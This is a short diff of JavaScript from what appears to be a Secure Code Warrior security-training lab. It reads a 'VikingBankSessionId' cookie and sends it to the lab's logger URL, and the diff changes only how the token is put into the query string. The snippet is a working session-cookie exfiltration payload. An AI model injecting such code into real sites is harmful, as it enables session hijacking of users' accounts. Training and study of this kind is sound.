@@ -15,6 +15,6 @@ function getCookie(cname) {
 }
 let token = getCookie('VikingBankSessionId');
 var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", 'https://m-7a05fe47-24a8-4072-b479-3f0c60d78e74-0.mission.securecodewarrior.com/labSession/v1/labLogger?token=' + token, 
+    xmlHttp.open( "GET", 'https://m-7a05fe47-24a8-4072-b479-3f0c60d78e74-0.mission.securecodewarrior.com/labSession/v1/labLogger?' + token, 
 	false );
     xmlHttp.send();
